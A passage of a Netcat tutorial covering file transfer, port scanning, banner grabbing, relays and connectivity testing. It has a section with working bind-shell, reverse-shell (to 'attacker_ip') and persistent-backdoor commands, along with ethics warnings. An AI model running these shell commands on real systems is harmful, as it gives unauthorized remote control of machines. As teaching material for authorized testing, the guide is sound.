to send the line.\n*   **`nc` exits immediately:** If the server exits right after a client connects and disconnects, it's often because Netcat, by default, closes the listening socket after the first connection. To keep it open for multiple connections (sequentially, not concurrently), you might need a loop or `ncat`'s `--listen-once` or `--keep-open` options. For simple `nc`, a `while` loop is common for persistent listening.\n\n### Web Server Testing\n\n#### What it is / Why it matters\nNetcat can act as a raw HTTP client, allowing you to manually craft and send HTTP requests to web servers. This is invaluable for testing server responses, checking headers, or debugging web applications without the overhead of a full browser.\n\n#### Step-by-step commands\n\n**1. Connect to a web server (e.g., Google's public web server):**\n```bash\nnc google.com 80\n```\n*(Replace `google.com` with your target web server's hostname or IP if testing a local service.)*\n\n**2. Send an HTTP GET request:**\nAfter connecting, type the following two lines, pressing `Enter` after each:\n```\nGET / HTTP/1.1\nHost: google.com\n```\n*(Press `Enter` a third time on an empty line to signal the end of the request headers.)*\n\n#### What to expect\nYou will receive the raw HTTP response from the server, including HTTP status codes, response headers (like `Content-Type`, `Server`, `Date`), and the HTML content of the requested page. This demonstrates the basic communication between a client and a web server.\n\n#### Troubleshooting & tips\n*   **No response:**\n    *   Ensure you press `Enter` twice after the `Host:` header to send the request properly.\n    *   Most modern websites use HTTPS (port 443). Netcat's standard version does not support SSL/TLS directly. If you need HTTPS, consider `Ncat` with `--ssl` (see Ncat features section) or `openssl s_client`.\n    *   The target host might block your IP or require specific headers.\n*   **\"Connection refused\":** The web server might not be running on port 80, or a firewall is blocking the connection.\n*   **`nc` hangs indefinitely:** The server might be expecting more data, or the connection is silently dropped. Try adding a timeout: `nc -w 5 google.com 80`.\n\n### UDP Communication\n\n#### What it is / Why it matters\nUnlike TCP, UDP is a connectionless protocol, meaning there's no handshake or guaranteed delivery. Netcat's `-u` option allows you to test UDP-based services like DNS or send quick, fire-and-forget messages, which is useful for diagnosing UDP-specific network issues.\n\n#### Step-by-step commands\n\n**1. Set up a UDP server (listen on port 1234):**\nOn one machine, run:\n```bash\nnc -u -l -p 1234\n# Or, if using OpenBSD Netcat:\n# nc -u -l 1234\n```\n\n**2. Connect a UDP client:**\nOn another machine, run (replace `localhost` with the server's IP):\n```bash\nnc -u localhost 1234\n```\nYou can now type messages in either terminal, and they will appear on the other side.\n\n**3. Test a public DNS server (e.g., Google DNS):**\nThis example sends a simple \"google.com\" query (though not a proper DNS query format, it demonstrates UDP sending) to port 53.\n```bash\necho \"google.com\" | nc -u 8.8.8.8 53\n```\n\n#### What to expect\n*   **UDP Chat:** Similar to TCP chat, typed messages will appear on the other side. Unlike TCP, if a packet is lost, it won't be retransmitted.\n*   **DNS Test:** The `echo` command will send \"google.com\" to the DNS server. You might not receive a meaningful reply with this simple string, as it's not a properly formatted DNS query packet. However, it confirms basic UDP connectivity. To get a real DNS response, you'd typically pipe output from a tool like `dig` or `nslookup` (or craft a proper DNS query in hex mode).\n\n#### Troubleshooting & tips\n*   **No response in UDP chat:** Since UDP is connectionless, there's no confirmation of delivery. Check firewalls if you're not seeing messages.\n*   **Packet loss:** UDP is susceptible to packet loss. If messages are inconsistent, this might be the reason.\n*   **DNS query:** For robust DNS testing, consider using `dig` or `nslookup` tools, which are designed for DNS queries, rather than a raw Netcat UDP send.\n\n## File Transfer\n\nNetcat can serve as a simple yet effective tool for transferring files between machines, even binary files.\n\n### What it is / Why it matters\nNetcat provides a straightforward method for transferring files, especially useful in environments where traditional file transfer protocols (like FTP, SCP, or HTTP) might be unavailable or blocked. It leverages standard input/output redirection to stream file contents across a network connection.\n\n### Step-by-step commands\n\n#### Send Files\n\n**1. Set up the receiver (server) to listen and save incoming data:**\nOn the receiving machine, open a terminal and run:\n```bash\nnc -l -p 1234 > received_file.txt\n# Or, for OpenBSD Netcat:\n# nc -l 1234 > received_file.txt\n```\n*(Replace `received_file.txt` with your desired output filename.)*\n\n**2. Send the file from the sender (client):**\nOn the sending machine, open a terminal and run (replace `target_host` with the receiver's IP address):\n```bash\nnc target_host 1234 < file_to_send.txt\n```\n*(Replace `file_to_send.txt` with the actual file you want to transfer.)*\n\n**For binary files (e.g., images, executables):**\nThe process is identical; Netcat handles binary data transparently.\n\n**1. Receiver:**\n```bash\nnc -l -p 1234 > received_image.jpg\n```\n\n**2. Sender:**\n```bash\nnc target_host 1234 < image.jpg\n```\n\n#### What to expect\n*   **Receiver:** The `nc` command will appear to hang, waiting for the sender. Once the sender finishes, `nc` on the receiver will terminate, and the `received_file.txt` (or `received_image.jpg`) will be created in the current directory with the transferred content.\n*   **Sender:** The `nc` command will execute and then terminate once the entire `file_to_send.txt` has been streamed to the receiver.\n*   **File integrity:** The transferred file should be an exact copy of the original. You can verify this using checksums (e.g., `md5sum`, `sha256sum`) on both the original and received files.\n\n#### Troubleshooting & tips\n*   **Incomplete files:**\n    *   Ensure the sender `nc` command completes successfully. If it's interrupted, the file might be truncated.\n    *   Netcat (especially older versions) might close the connection prematurely if there's a delay. Add a timeout to the *sender* (`-w` option) to ensure it finishes sending all data if the receiver is slow to process.\n*   **Permissions:** Ensure the user running the receiver command has write permissions in the target directory to create `received_file.txt`.\n*   **Existing file:** If `received_file.txt` already exists, it will be overwritten without warning.\n*   **Firewall:** Check firewalls on both sender and receiver if the connection fails.\n*   **Plaintext:** Netcat transfers data in plaintext. Do not use it for sensitive data over untrusted networks without prior encryption (e.g., `gpg` or `openssl`).\n\n### Directory Transfer\n\n#### What it is / Why it matters\nWhile Netcat can't transfer directories directly, it can be combined with archiving tools like `tar` and compression tools like `gzip` to stream entire directories, including their structure and contents, across the network efficiently.\n\n#### Step-by-step commands\n\n**1. Set up the receiver (server) to receive and extract the directory:**\nOn the receiving machine, run:\n```bash\nnc -l -p 1234 | tar -xzf -\n# Or, for OpenBSD Netcat:\n# nc -l 1234 | tar -xzf -\n```\n*(This command listens on port 1234, receives the compressed tarball, and extracts it.)*\n\n**2. Send the directory from the sender (client):**\nOn the sending machine, run (replace `target_host` with the receiver's IP and `/path/to/directory` with the actual directory):\n```bash\ntar -czf - /path/to/directory | nc target_host 1234\n```\n*(This command creates a gzipped tar archive of the directory and pipes it to Netcat for transfer.)*\n\n**For transferring a large file with compression:**\n\n**1. Receiver:**\n```bash\nnc -l -p 1234 | gunzip > large_file.txt\n```\n\n**2. Sender:**\n```bash\ngzip -c large_file.txt | nc target_host 1234\n```\n\n#### What to expect\n*   **Receiver:** The `nc` command will wait. Once the sender begins transmitting, `tar` will start extracting the contents. A new directory (with the same name as the sent directory) will appear, populated with the transferred files and subdirectories.\n*   **Sender:** The `tar` and `nc` commands will execute, transferring the compressed archive. The commands will terminate once the transfer is complete.\n\n#### Troubleshooting & tips\n*   **\"tar: This does not look like a tar archive\":** This usually means the sender did not send the correct format, or the connection broke mid-transfer. Ensure the sender's `tar` command is correctly forming the archive.\n*   **`tar` errors:** Permissions issues on the receiver might prevent `tar` from creating files or directories.\n*   **Disk space:** Ensure enough disk space on the receiver for the extracted directory.\n*   **Plaintext and security:** Remember that the `tar` stream itself is not encrypted by Netcat. For sensitive data, ensure the network is trusted or pre-encrypt the data (e.g., `tar -czf - /path/to/directory | gpg --encrypt --output - | nc target_host 1234`).\n\n## Port Scanning\n\nNetcat can be used to perform basic port scanning, identifying open ports on a target system.\n\n### What it is / Why it matters\nPort scanning is a fundamental step in network reconnaissance and security auditing. It helps determine which services are exposed on a target machine. Netcat's `-z` (zero-I/O) option, combined with verbose output, makes it a quick and easy way to check for listening services without sending any application-layer data.\n\n### Step-by-step commands\n\n#### Basic Port Scanning\n\n**1. Scan a single port:**\nCheck if port 80 is open on `example.com`.\n```bash\nnc -z -v example.com 80\n```\n*(Replace `example.com` with the target IP or hostname.)*\n\n**2. Scan a range of ports:**\nCheck ports 20 through 25 on `example.com`.\n```bash\nnc -z -v example.com 20-25\n```\n\n**3. Scan multiple specific ports:**\nCheck ports 22, 80, and 443 on `example.com`.\n```bash\nnc -z -v example.com 22 80 443\n```\n\n**4. UDP port scan:**\nCheck if UDP port 53 (DNS) is open on `example.com`.\n```bash\nnc -u -z -v example.com 53\n```\n*(Note: UDP scanning with `-z` is less reliable than TCP because UDP is connectionless. A `closed` status might just mean no response, not necessarily that the port is definitively closed.)*\n\n#### What to expect\n*   **Open port:** For TCP, you'll typically see output like `Connection to example.com 80 port [tcp/http] succeeded!`.\n*   **Closed port:** You might see `nc: connect to example.com port 80 (tcp) failed: Connection refused` or `Connection to example.com 80 port [tcp/http] failed: Connection refused`.\n*   **Filtered port:** You might see `Connection to example.com 80 port [tcp/http] failed: No route to host` or the command might simply hang for a while before timing out, indicating a firewall is silently dropping packets.\n*   **UDP:** For UDP, if `nc` connects successfully, it typically reports `Connection to example.com 53 port [udp/domain] succeeded!`. However, if the port is closed, it might just hang and eventually timeout, or report `Connection refused` (less common for UDP).\n\n#### Troubleshooting & tips\n*   **Slow scans:** Without a timeout, `nc` can hang for a long time on filtered ports. Use `-w` for faster scans.\n*   **Firewall blocking:** If all ports appear \"filtered\" or time out, a firewall (local or network) is likely blocking your scan attempts.\n*   **DNS resolution:** If you get \"Name or service not known\", use `-n` to force numeric IPs or check your DNS configuration.\n*   **`-z` behavior:** The `-z` option (zero-I/O) is essential for scanning. Without it, Netcat will try to establish a full connection and potentially send data, which is not what you want for a simple port scan.\n*   **Verbose (`-v`) for clarity:** Always use `-v` to see the status of each port.\n\n### Advanced Scanning\n\n#### What it is / Why it matters\nCombining Netcat's scanning capabilities with scripting and other command-line tools allows for more efficient and customizable port scanning, result filtering, and even scanning multiple targets.\n\n#### Step-by-step commands\n\n**1. Fast scan with timeout:**\nScan ports 1 through 1000 on `example.com` with a 1-second timeout per port.\n```bash\nnc -z -v -w 1 example.com 1-1000\n```\n\n**2. Scan and save only successful results:**\nPipe the verbose output to `grep` to filter for \"succeeded\" messages.\n```bash\nnc -z -v -w 1 example.com 1-100 2>&1 | grep \"succeeded\"\n```\n*(Note: `2>&1` redirects standard error (where `nc` prints verbose output) to standard output so `grep` can process it.)*\n\n**3. Scan multiple hosts (using a shell loop):**\nScan port 22 on a range of IP addresses (e.g., 192.168.1.1 to 192.168.1.10).\n```bash\nfor host in 192.168.1.{1..10}; do\n    echo \"Scanning $host...\"\n    nc -z -v -w 1 $host 22\ndone\n```\n\n#### What to expect\n*   **Fast scan:** Quicker results, especially on networks with many closed or filtered ports.\n*   **Filtered results:** Only lines containing \"succeeded\" (indicating an open port) will be displayed.\n*   **Multiple hosts:** The loop will sequentially scan each host in the specified range, printing the status for port 22 on each.\n\n#### Troubleshooting & tips\n*   **Accuracy vs. Speed:** A shorter timeout (`-w`) makes scans faster but might miss slow-responding open ports. Adjust as needed.\n*   **Too many connections:** Be mindful of the number of connections you're making. Aggressive scanning can trigger Intrusion Detection Systems (IDS) or Intrusion Prevention Systems (IPS) and might be interpreted as a hostile act.\n*   **Resource limits:** Shell loops can be slow for large ranges. For serious port scanning, specialized tools like Nmap are much more efficient and feature-rich.\n*   **UDP reliability:** Remember that UDP port scanning with Netcat is still less reliable than TCP, even with advanced scripting.\n\n### Safety / ethics note\n\n**WARNING:** Port scanning without explicit authorization can be considered an unauthorized intrusion attempt and is illegal in many jurisdictions. Always obtain written permission from the network owner before performing any port scanning activities on systems you do not own. Use these techniques only on your own controlled networks or in lab environments for educational purposes.\n\n## Backdoors & Reverse Shells\n\nNetcat is famously used to create simple backdoors and reverse shells, providing remote command-line access. **Due to the significant security implications, these techniques should ONLY be practiced in controlled, authorized lab environments.**\n\n### What it is / Why it matters\nBind shells and reverse shells are fundamental concepts in penetration testing and system administration, enabling remote execution of commands. Netcat's ability to execute a program (`-e` option) upon connection makes it a powerful, albeit often simplistic, tool for establishing such shells. A **bind shell** listens on a target machine for an incoming connection, while a **reverse shell** initiates an outbound connection from the target to a listening attacker, often bypassing firewalls.\n\n### Bind Shell\n\n#### What it is / Why it matters\nA bind shell turns the target machine into a server that listens on a specified port. When an attacker connects to this port, the target machine automatically executes a command-line interpreter (like `/bin/bash` or `cmd.exe`), providing the attacker with remote shell access. This is effective when the attacker can directly connect to a port on the target machine.\n\n#### Step-by-step commands\n\n**1. Target machine (creates the backdoor/bind shell):**\nOpen a terminal on the target machine and run:\n```bash\nnc -l -p 4444 -e /bin/bash\n# Or, for OpenBSD Netcat, '-e' might be deprecated or behave differently.\n# A common workaround is:\n# mkfifo /tmp/f; cat /tmp/f | nc -l 4444 > /tmp/f 2>&1; rm /tmp/f\n# This pipe-based approach avoids the '-e' flag which can be a security risk and is not available in all Netcat versions.\n```\n**For Windows bind shell (using Ncat or a Windows port of Netcat):**\n```bash\nncat -l -p 4444 -e cmd.exe\n```\n\n**2. Attacker machine (connects to the backdoor):**\nOn the attacker's machine, open a terminal and run (replace `target_ip` with the actual IP address of the target machine):\n```bash\nnc target_ip 4444\n```\n\n#### What to expect\n*   **Target:** The `nc` command will appear to hang, listening. When the attacker connects, the shell (`/bin/bash` or `cmd.exe`) will be spawned and redirected to the network connection. The target machine itself will show no immediate interaction.\n*   **Attacker:** After connecting, the attacker's terminal will display a shell prompt (e.g., `$` or `C:\\>`). You can now type commands, and they will be executed on the target machine.\n\n#### Troubleshooting & tips\n*   **\"Connection refused\":**\n    *   The bind shell command might not be running on the target.\n    *   A firewall on the target is likely blocking port 4444.\n    *   Antivirus/EDR solutions might detect and kill the Netcat process.\n*   **No prompt:** If you connect but don't see a prompt, try typing a command (e.g., `ls` or `dir`) and pressing `Enter`. The shell might be there but not displaying a prompt.\n*   **Limited shell:** The shell might be non-interactive (e.g., no tab completion, arrow keys don't work). For a fully interactive shell, more advanced techniques (like Python's `pty` module or `socat`) are often needed.\n*   **Windows `nc.exe` and `-e`:** Many Windows `nc.exe` ports do not support the `-e` flag reliably. `Ncat` from Nmap is highly recommended for its `-e` support on Windows.\n\n### Reverse Shell\n\n#### What it is / Why it matters\nA reverse shell is often more effective than a bind shell because the connection originates from the target machine *outward* to the attacker. This technique often bypasses firewalls that typically block inbound connections but allow outbound connections (e.g., to the internet). The attacker sets up a listener, and the target machine connects back to it, then executes a shell.\n\n#### Step-by-step commands\n\n**1. Attacker machine (sets up the listener):**\nOn the attacker's machine, open a terminal and run:\n```bash\nnc -l -p 4444\n# Or, for OpenBSD Netcat:\n# nc -l 4444\n```\n\n**2. Target machine (connects back to the attacker and sends a shell):**\nOn the target machine, run (replace `attacker_ip` with the actual IP address of the attacker's machine):\n```bash\nnc attacker_ip 4444 -e /bin/bash\n# Or, for OpenBSD Netcat using pipe-based method:\n# mkfifo /tmp/f; nc attacker_ip 4444 < /tmp/f | cat > /tmp/f 2>&1; rm /tmp/f\n```\n**For Windows reverse shell (using Ncat or a Windows port of Netcat):**\n```bash\nncat attacker_ip 4444 -e cmd.exe\n```\n\n#### What to expect\n*   **Attacker:** The `nc -l` command will hang, waiting. Once the target connects, the attacker's terminal will immediately display a shell prompt, providing remote access to the target.\n*   **Target:** The `nc` command will execute and then appear to hang, as the shell is now redirected over the network.\n\n#### Troubleshooting & tips\n*   **No connection on attacker:**\n    *   Ensure the attacker's listener is running *before* the target attempts to connect.\n    *   Verify the `attacker_ip` is correct and reachable from the target.\n    *   Check firewalls on the attacker machine (especially inbound rules for port 4444).\n    *   Check outbound firewall rules on the target machine.\n*   **Limited shell:** As with bind shells, the shell might be non-interactive.\n*   **Antivirus/EDR:** Reverse shells are a common attack vector and are often detected and blocked by security software.\n\n### Persistent Backdoor\n\n#### What it is / Why it matters\nA basic Netcat shell typically terminates after the first connection or if the connection is broken. For persistence in a security testing scenario, you might want the backdoor to continuously listen or re-establish itself. This can be achieved using simple shell loops.\n\n#### Step-by-step commands\n\n**1. Create a persistent bind shell listener on the target machine:**\nThis command will continuously restart the listener if the connection drops.\n```bash\nwhile true; do nc -l -p 4444 -e /bin/bash; done\n```\n\n**2. One-liner persistent bind shell (less robust):**\nThis simply restarts `nc` twice, offering limited persistence.\n```bash\nnc -l -p 4444 -e /bin/bash; nc -l -p 4444 -e /bin/bash\n```\n\n#### What to expect\n*   **Persistent Listener:** The `while true` loop ensures that even if the attacker disconnects or the connection is otherwise terminated, the Netcat listener will immediately restart and await a new connection, making the backdoor more resilient.\n\n#### Troubleshooting & tips\n*   **Resource consumption:** A constantly running `while true` loop can consume system resources, especially if the `-e` flag is not closing the spawned shell process properly.\n*   **Detection:** Persistent backdoors are highly detectable by security software and system administrators.\n*   **Stability:** Simple `while` loops might not handle all error conditions gracefully.\n\n### Safety / ethics note\n\n**WARNING: The use of Netcat for creating backdoors and reverse shells is an extremely powerful technique that carries significant legal and ethical risks.**\n\n*   **Illegality:** Creating and deploying backdoors on systems you do not own, or without explicit, written authorization, is illegal and constitutes a criminal offense (e.g., unauthorized access, computer misuse).\n*   **Data exposure:** These methods bypass security controls and can expose sensitive data.\n*   **System compromise:** Gaining shell access can lead to complete system compromise, privilege escalation, and further malicious activities.\n*   **Responsible Use:** These techniques should **only** be used in:\n    *   **Controlled laboratory environments** for educational purposes.\n    *   **Authorized penetration testing** where you have explicit, written consent and a clear scope of work from the system owner.\n*   **Never use these techniques on production systems or networks you do not own.** Misuse can lead to severe penalties, including fines and imprisonment.\n\n## Network Relay & Proxying\n\nNetcat can act as a basic network relay or proxy, forwarding traffic between two endpoints.\n\n### What it is / Why it matters\nNetcat's ability to read from one connection and write to another makes it suitable for simple network relaying or port forwarding. This can be useful for:\n*   Bypassing strict firewall rules (e.g., forwarding traffic from an allowed port to a blocked internal service).\n*   Creating a simple proxy for traffic analysis.\n*   Connecting services that are not directly reachable.\n\n### Simple Relay\n\n#### What it is / Why it matters\nA simple relay allows traffic arriving on one Netcat listener to be forwarded to another target host and port, effectively acting as a bridge. This can be used to connect an external client to an internal service that might not be directly exposed.\n\n#### Step-by-step commands\n\n**1. Create a relay between two services (using named pipes):**\nThis example listens on port 8080 and forwards incoming traffic to `target_host` on port 80, and vice-versa.\n```bash\n# On the relay machine:\nmkfifo backpipe\nnc -l -p 8080 < backpipe | nc target_host 80 > backpipe\n# Or, for OpenBSD Netcat (syntax might be simpler as `nc -l 8080 | nc target_host 80` but requires separate processes for bi-directionality without pipes)\n```\n*(Replace `target_host` with the actual IP/hostname of the service you want to relay to.)*\n\n**2. Relay with logging (using `tee`):**\nThis example listens on port 8080, forwards traffic to `target_host:80`, and logs all data passing through to `log.txt`.\n```bash\n# On the relay machine:\nnc -l -p 8080 | tee log.txt | nc target_host 80\n```\n\n#### What to expect\n*   **Relay:** When a client connects to the relay machine on port 8080, and the relay successfully connects to `target_host:80`, the client's traffic will be transparently forwarded.\n*   **Logging:** If using `tee`, the `log.txt` file will capture all bidirectional communication.\n\n#### Troubleshooting & tips\n*   **`mkfifo` errors:** Ensure you have permissions to create a named pipe (`mkfifo`).\n*   **Broken pipes:** Named pipe setups can be fragile; if one side of the connection terminates unexpectedly, the pipe might break.\n*   **Asymmetry:** Simple pipes might not handle bidirectional traffic perfectly, especially with simultaneous writes. More robust proxies (`socat` or specialized tools) are better for high-traffic or complex scenarios.\n*   **Performance:** Netcat relays are basic and not optimized for performance or handling many concurrent connections.\n\n### Port Forwarding\n\n#### What it is / Why it matters\nPort forwarding, in this context, allows a local port on the Netcat machine to act as an entry point for a remote service. Any connection to the local port is then forwarded to a specified remote host and port. This is essentially another form of relaying, useful for making a remote service appear local or for tunneling.\n\n#### Step-by-step commands\n\n**1. Forward local port to a remote service (using `-c` or `-e` for execution):**\nThis example listens on local port 8080 and, for each incoming connection, spawns a `nc` process to connect to `remote_host:80`.\n```bash\n# For GNU Netcat or Ncat:\nnc -l -p 8080 -c \"nc remote_host 80\"\n# Or, if using '-e' on compatible versions:\n# nc -l -p 8080 -e \"nc remote_host 80\"\n```\n*(Replace `remote_host` with the actual IP/hostname.)*\n\n**2. Bidirectional relay with named pipes (more robust):**\nThis is a more robust way to create a bidirectional port forward between a local listener and a remote host.\n```bash\n# On the forwarding machine:\nmkfifo /tmp/fifo\nnc -l -p 8080 < /tmp/fifo | nc target_host 80 > /tmp/fifo\n```\n\n#### What to expect\n*   **Client perspective:** A client connecting to the `forwarding_machine:8080` will effectively be communicating with `target_host:80`.\n*   **Functionality:** If `target_host:80` is a web server, the client will be able to make HTTP requests as if directly connected to `target_host`.\n\n#### Troubleshooting & tips\n*   **`-c` or `-e` limitations:** The `-c` (for `cmd` or `sh`) or `-e` (for `exec`) flags are typically specific to GNU Netcat or Ncat and are not present in OpenBSD Netcat. The named pipe method is more portable across Netcat versions.\n*   **Single connection:** Many Netcat implementations will only handle one connection and then terminate. For persistent forwarding, a loop or a more capable tool like `socat` is needed.\n*   **Firewall:** Ensure firewalls are configured to allow traffic on both the listening port (e.g., 8080) and the outgoing connection to the remote service.\n\n### Safety / ethics note\n\n**WARNING:** Using Netcat for network relaying or proxying can have security implications:\n\n*   **Undetected traffic:** Relaying traffic can allow an attacker to bypass firewalls or network monitoring, tunneling malicious traffic through seemingly legitimate ports.\n*   **Data exposure:** Like all Netcat communications, relayed data is typically unencrypted.\n*   **Unauthorized access:** Creating relays to internal services can inadvertently expose them to external attackers if the relay machine is compromised.\n\nAlways ensure you have proper authorization and understand the security implications before setting up network relays.\n\n## Banner Grabbing & Service Detection\n\nNetcat can easily perform banner grabbing, which involves connecting to a network port and observing the initial data sent back by the service. This often reveals the service name, version, and operating system.\n\n### What it is / Why it matters\nBanner grabbing is a reconnaissance technique used to identify the type and version of services running on open ports. This information is crucial for security assessments, as known vulnerabilities are often tied to specific service versions. Netcat's ability to initiate raw TCP/UDP connections and send minimal data makes it ideal for this task.\n\n### Step-by-step commands\n\n#### Common Services\n\n**1. HTTP banner (Port 80):**\nSend a basic HTTP HEAD request to get server information.\n```bash\necho \"HEAD / HTTP/1.0\\r\\n\\r\\n\" | nc example.com 80\n```\n*(The `\\r\\n\\r\\n` ensures two newlines for the end of the HTTP request header.)*\n\n**2. SMTP banner (Port 25):**\nConnect to an SMTP server; it typically sends its banner immediately.\n```bash\nnc mail.example.com 25\n```\n\n**3. FTP banner (Port 21):**\nConnect to an FTP server for its initial greeting.\n```bash\nnc ftp.example.com 21\n```\n\n**4. SSH banner (Port 22):**\nConnect to an SSH server; it often sends its version banner first.\n```bash\nnc ssh.example.com 22\n```\n\n**5. Telnet banner (Port 23):**\nConnect to a Telnet server.\n```bash\nnc telnet.example.com 23\n```\n\n#### What to expect\n*   You will receive text output containing information about the service, such as `Server: Apache/2.4.41 (Ubuntu)`, `220 mail.example.com ESMTP Postfix`, `220 (vsFTPd 3.0.3)`, `SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.3`, etc.\n*   The exact banner depends on the service and its configuration. Some services might not provide detailed banners or might require specific input to elicit a response.\n\n#### Troubleshooting & tips\n*   **No banner:**\n    *   The service might not be running on that port.\n    *   A firewall might be blocking the connection.\n    *   The service might require specific input *after* connection before sending a banner (e.g., some database servers).\n    *   Add a timeout (`-w`) to prevent hanging.\n*   **Incomplete banner:** If the output is truncated, the connection might be closing too quickly.\n*   **`Connection refused`:** The port is likely closed or filtered.\n*   **`Connection timed out`:** A firewall is likely dropping the packets, or the host is down.\n\n### Automated Banner Grabbing\n\n#### What it is / Why it matters\nAutomating banner grabbing across multiple ports or hosts streamlines the reconnaissance process, quickly gathering service information for further analysis.\n\n#### Step-by-step commands\n\n**Script to grab banners from multiple common ports:**\n```bash\n#!/bin/bash\nTARGET_HOST=\"target_host\" # Replace with the actual IP or hostname\n\necho \"--- Banner Grabbing for $TARGET_HOST ---\"\nfor port in 21 22 23 25 53 80 110 143 443 993 995; do\n    echo \"Port $port:\"\n    # Use 'timeout' to prevent nc from hanging indefinitely on non-responsive ports\n    # '-v' for verbose, '-n' for numeric (no DNS lookup)\n    timeout 3 nc -v -n $TARGET_HOST $port < /dev/null\n    echo \"---\"\ndone\n```\n*(Save this as `banner_grab.sh`, make it executable with `chmod +x banner_grab.sh`, and run `./banner_grab.sh`)*\n\n#### What to expect\nThe script will iterate through the specified ports, attempt to connect to each, and print any banner received. Ports that are closed or filtered will result in connection refused or timeout messages.\n\n#### Troubleshooting & tips\n*   **`timeout: command not found`:** The `timeout` utility is part of GNU Core Utilities. It might not be available on all systems or might need to be installed (`sudo apt install coreutils` on Debian/Ubuntu).\n*   **Aggressive scanning:** Rapid connections can trigger IDS/IPS.\n*   **HTTPS (Port 443):** Direct Netcat connections to HTTPS (SSL/TLS) ports will usually fail unless you use `Ncat` with `--ssl` or `openssl s_client`. The `timeout` command will simply close the connection after 3 seconds without a proper SSL handshake.\n*   **Verbosity:** Increase the timeout or add more `echo` statements for better debugging if the script isn't behaving as expected.\n\n### Safety / ethics note\n\n**WARNING:** Banner grabbing can be seen as an intrusive reconnaissance activity.\n\n*   **Information Disclosure:** The information gathered (service versions, OS) can reveal potential vulnerabilities.\n*   **Legal & Ethical Use:** Always ensure you have explicit authorization from the network owner before performing banner grabbing on any system you do not own. Use these techniques only in authorized penetration tests, controlled lab environments, or on your own systems.\n\n## Network Testing & Troubleshooting\n\nNetcat is an excellent first-response tool for quick network diagnostics and connectivity testing.\n\n### What it is / Why it matters\nWhen network services aren't working, Netcat can rapidly verify basic connectivity, determine if a port is open, or assess network performance. Its simplicity allows for quick checks without requiring complex debugging tools.\n\n### Step-by-step commands\n\n#### Connectivity Testing\n\n**1. Test if a TCP port is open:**\n```bash\nnc -z -v example.com 80\n```\n*(A `succeeded!` message indicates the port is open and listening.)*\n\n**2. Test with a timeout:**\nPrevent `nc` from hanging on filtered or unresponsive ports.\n```bash\nnc -z -v -w 5 example.com 80\n```\n\n**3. Test UDP connectivity:**\n```bash\nnc -u -z -v example.com 53\n```\n*(Less reliable than TCP for confirming \"open\" status due to UDP's connectionless nature.)*\n\n**4. Test multiple ports quickly:**\n```bash\nnc -z -v example.com 80 443 22 21\n```\n\n#### What to expect\n*   **`succeeded!`:** The target port is open and listening.\n*   **`Connection refused`:** The target host is reachable, but the specific port is closed (no service listening).\n*   **`Connection timed out`:** The target host or port is likely filtered by a firewall, or the host is down/unreachable.\n*   **`No route to host`:** The target IP is not reachable from your machine.\n\n#### Troubleshooting & tips\n*   **Firewall:** The most common reason for failed connections. Check local and network firewalls.\n*   **DNS Issues:** If using hostnames, try the IP directly. If it works, you have a DNS resolution problem.\n*   **Target service:** Ensure the service you're trying to connect to is actually running on the target machine.\n*   **Verbose mode (`-v`):** Always use it for diagnostic output.\n*   **Loopback:** Test `localhost` first to rule out local machine issues.\n\n### Performance Testing\n\n#### What it is / Why it matters\nNetcat, when combined with tools like `dd`, can be used for rough estimates of network throughput (bandwidth) and latency. This helps diagnose bottlenecks or slow network links.\n\n#### Step-by-step commands\n\n**1. Bandwidth test (Receiver):**\nOn the receiving machine, open a terminal and run:\n```bash\nnc -l -p 1234 > /dev/null\n```\n*(This command listens on port 1234 and discards all incoming data.)*\n\n**2. Bandwidth test (Sender):**\nOn the sending machine, open a terminal and run (replace `target_host` with receiver's IP):\n```bash\ndd if=/dev/zero bs=1M count=100 | nc target_host 1234\n```\n*(This sends 100MB of zeros. `dd` will report the transfer speed.)*\n\n**3. Latency test (basic round-trip time):**\n```bash\ntime echo \"test\" | nc example.com 80\n```\n*(This measures the time it takes to establish a connection and send/receive a small amount of data.)*\n\n#### What to expect\n*   **Bandwidth Test:** The `dd` command on the sender will output statistics like `100+0 records in`, `100+0 records out`, and crucially, the `bytes transferred` and `seconds` taken, from which you can calculate the bandwidth (e.g., MB/s). The receiver will simply wait until the transfer is complete.\n*   **Latency Test:** The `time` command will output real, user, and sys times, giving you an idea of the round-trip latency. This is a very rough measure, not as precise as `ping` or specialized tools.\n\n#### Troubleshooting & tips\n*   **`dd` errors:** Ensure `dd` is available (it's standard on Linux/macOS).\n*   **`time` output:** Understand the different `time` metrics (real, user, sys). `real` is the wall-clock time.\n*   **Accuracy:** Netcat-based performance tests are crude. For accurate, high-volume performance testing, use dedicated tools like `iperf3`.\n*   **Network load:** Be aware that generating significant traffic with `dd` can impact other network users.\n\n## Security Testing\n\nNetcat can be leveraged for various security testing activities, including firewall rule validation and basic service enumeration.\n\n### What it is / Why it matters\nNetcat's ability to create raw network connections makes it a fundamental tool for probing network defenses. Security testers use it to:\n*   Verify firewall rules by attempting to reach blocked services.\n*   Identify open ports and potentially vulnerable services.\n*   Simulate network attacks in a controlled environment.\n\n### Step-by-step commands\n\n#### Firewall Testing\n\n**1. Test outbound connections:**\nVerify if your machine can connect to external common ports (e.g., web, secure web, SSH).\n```bash\nnc -z -v external_host 80 443 22\n```\n*(Replace `external_host` with a known external IP or hostname.)*\n\n**2. Test inbound connections (from an external machine):**\nSet up a listener on your machine and try to connect to it from an external machine to see if inbound traffic is allowed.\n```bash\n# On your machine:\nnc -l -p 1234 -v\n\n# From an external machine:\nnc your_ip 1234\n```\n\n**3. Test specific protocols (e.g., UDP DNS):**\nCheck if outbound UDP traffic to a DNS server is allowed.\n```bash\nnc -u -z -v dns_server 53\n```\n*(Replace `dns_server` with a known DNS server IP, like `8.8.8.8` or `1.1.1.1`.)*\n\n#### What to expect\n*   **Outbound:** `succeeded!` indicates the connection was permitted; `Connection refused` or `timed out` indicates blocking.\n*   **Inbound:** If the external machine connects, your listener will log the connection (`Connection from [external_ip] port [ephemeral_port] received!`). If not, it means the firewall is blocking.\n*   **UDP:** `succeeded!` or no immediate error suggests outbound UDP is allowed to that port.\n\n#### Troubleshooting & tips\n*   **`your_ip`:** Ensure you use the correct *public* IP address if testing from outside your local network.\n*   **Local firewalls:** Don't forget to check `ufw`, `firewalld`, `iptables` on Linux, or Windows Defender Firewall.\n*   **Network topology:** Understand where your firewall is (router, enterprise firewall, local machine) when troubleshooting.\n\n#### Service Enumeration\n\n**1. Enumerate common web servers:**\nScan a target for various web server ports.\n```bash\nfor port in 80 8080 8443 443; do\n    echo \"Scanning target_host:$port\"\n    nc -z -v -w 1 target_host 